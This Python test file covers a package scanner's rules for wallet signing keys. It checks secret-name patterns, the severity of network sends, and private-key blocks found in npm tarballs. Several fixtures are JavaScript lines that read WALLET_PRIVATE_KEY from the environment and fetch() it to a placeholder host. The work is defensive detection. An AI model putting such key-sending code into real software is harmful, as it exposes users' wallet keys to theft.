"""The raw signing-key rules (2026-11-06). Answer-level twins and controls live in
tests/adversarial/cases_signing_key.py; these pin the pieces."""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import npm_result_from_tarball
from src.scanner.scan import ScanResult, _scan_content, apply_artifact_scan
from src.scanner.signing_key_flow import is_signing_key_name, signing_key_sends
from tests.adversarial.cases_signing_key import FAKE_HEX, FAKE_PEM, pkg, tgz

URL = "https://api.gadget.example.com/execute"
SEND = "Wallet private key sent over the network"


@pytest.mark.parametrize("name", [
    "PRIVATE_KEY", "WALLET_PRIVATE_KEY", "EVM_PRIVATE_KEY", "SOLANA_SECRET_KEY", "MNEMONIC",
    "WALLET_MNEMONIC", "SEED_PHRASE", "WALLET_KEY", "ETH_PK", "SIGNER_PRIVATE_KEY",
    "GADGET_WALLET_PRIVATE_KEY", "X402_PRIVATE_KEY",
])
def test_wallet_signing_key_names(name):
    assert is_signing_key_name(name)


@pytest.mark.parametrize("name", [
    "STRIPE_PRIVATE_KEY", "IMAGEKIT_PRIVATE_KEY", "AWS_SECRET_KEY", "OPENAI_API_KEY",
    "WALLET_API_KEY", "WALLETCONNECT_PROJECT_ID", "GOOGLE_PRIVATE_KEY", "SEED", "PK",
    "RANDOM_SEED",
])
def test_api_credentials_and_config_are_not_signing_keys(name):
    assert not is_signing_key_name(name)


def test_hardcoded_host_is_critical_and_names_the_host():
    src = ('const K = process.env.WALLET_PRIVATE_KEY;\n'
           f'export const go = () => fetch("{URL}", {{ headers: {{ "X-Pay": K }} }});\n')
    (send,) = signing_key_sends(src, "index.js")
    assert send.severity == "critical"
    assert send.hosts == ["api.gadget.example.com"]


def test_env_override_with_a_hardcoded_default_is_the_hardcoded_host():
    src = (f'const D = "{URL}";\nconst E = process.env.PAY_URL || D;\n'
           'const K = process.env.WALLET_PRIVATE_KEY;\n'
           'export const go = () => fetch(E, { headers: { "X-Pay": K } });\n')
    (send,) = signing_key_sends(src, "index.js")
    assert send.severity == "critical"


def test_only_a_user_configured_endpoint_is_high():
    src = ('const E = process.env.PAY_URL;\nconst K = process.env.WALLET_PRIVATE_KEY;\n'
           'export const go = () => fetch(E, { headers: { "X-Pay": K } });\n')
    (send,) = signing_key_sends(src, "index.js")
    assert send.severity == "high"
    assert send.hosts == []


def test_a_commented_out_send_is_not_a_send():
    src = ('const K = process.env.WALLET_PRIVATE_KEY;\n'
           f'// fetch("{URL}", {{ headers: {{ "X-Pay": K }} }});\n')
    assert signing_key_sends(src, "index.js") == []


def test_finding_is_exfiltration_never_secret_and_does_not_print_a_value():
    src = ('const K = process.env.WALLET_PRIVATE_KEY;\n'
           f'export const go = () => fetch("{URL}", {{ headers: {{ "X-Pay": K }} }});\n')
    findings, _pos, _sup = _scan_content(src, "index.js", set())
    (f,) = [x for x in findings if x.name == SEND]
    assert f.category == "exfiltration"
    assert f.line_number == 2
    assert "WALLET_PRIVATE_KEY" in f.snippet


def _scan(files):
    fetched = npm_result_from_tarball("adv-case", "1.0.0", tgz(pkg(files)))
    r = ScanResult(repo="npm:adv-case", stars=0, description="", framework="")
    apply_artifact_scan(r, "npm", fetched)
    return r.findings


@pytest.mark.parametrize("path,text", [
    ("key.pem", FAKE_PEM), ("server.key", FAKE_PEM), ("notes.txt", FAKE_PEM),
    ("registry-auth", FAKE_PEM), ("privkey.hex", FAKE_HEX), ("wallet-key.txt", f"0x{FAKE_HEX}\n"),
])
def test_shipped_private_key_is_critical_secret_and_shows_no_value(path, text):
    (f,) = [x for x in _scan({"index.js": "export const a = 1;\n", path: text})
            if x.name == "Private Key block"]
    assert (f.category, f.severity, f.file_path) == ("secret", "critical", path)
    assert FAKE_HEX not in f.snippet and "BEGIN" not in f.snippet


@pytest.mark.parametrize("path", ["test/fixtures/server.key", "README.md"])
def test_key_in_a_test_or_doc_file_is_informational(path):
    (f,) = [x for x in _scan({"index.js": "export const a = 1;\n", path: FAKE_PEM})
            if x.name == "Private Key block"]
    assert f.severity == "info"


@pytest.mark.parametrize("path,text", [
    ("pubkey.pem", FAKE_PEM.replace("PRIVATE", "PUBLIC")),
    ("index.js.sha256", FAKE_HEX),
    ("key.pem.example", "-----BEGIN PRIVATE KEY-----\nyour key here\n"),
])
def test_public_keys_checksums_and_placeholders_are_not_keys(path, text):
    assert not [x for x in _scan({"index.js": "export const a = 1;\n", path: text})
                if x.name == "Private Key block"]
